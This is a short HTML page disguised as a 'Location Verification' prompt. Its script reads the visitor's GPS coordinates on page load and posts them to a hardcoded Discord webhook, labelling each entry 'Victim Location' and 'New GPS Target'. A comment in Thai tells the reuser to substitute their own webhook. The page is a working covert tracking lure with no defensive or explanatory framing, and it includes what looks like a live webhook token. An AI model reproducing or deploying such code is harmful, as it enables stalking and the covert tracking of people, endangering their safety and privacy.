<!DOCTYPE html>
<html>
<head>
  <title> Location Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
    .box { border: 1px solid #ccc; padding: 20px; border-radius: 12px; display: inline-block; }
  </style>
</head>
<body>
  <div class="box">
    <h2> Please confirm your location</h2>
    <p id="status">Waiting for GPS access...</p>
  </div>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1298106884514910229/PBDKokWcVPpeFlzFiDnU1qxU7EIaHYirj0fWcltWIYQl2gIEhQTJJra4jJCaZ2PoXNdd"; // 👉 เปลี่ยนเป็นของคุณ

    function sendLocation(lat, lon, acc) {
      const data = {
        content: "**🎯 New GPS Target**",
        embeds: [{
          title: "📍 Victim Location",
          color: 16711680,
          fields: [
            { name: "Latitude", value: lat.toFixed(6), inline: true },
            { name: "Longitude", value: lon.toFixed(6), inline: true },
            { name: "Accuracy", value: acc + " meters", inline: true },
            { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lon}` }
          ],
          timestamp: new Date()
        }]
      };

      fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      });

      document.getElementById("status").textContent = " Location sent successfully!";
    }

    navigator.geolocation.getCurrentPosition(
      pos => {
        const { latitude, longitude, accuracy } = pos.coords;
        sendLocation(latitude, longitude, accuracy);
      },
      err => {
        document.getElementById("status").textContent = " Error: " + err.message;
      }
    );
  </script>
</body>
</html>
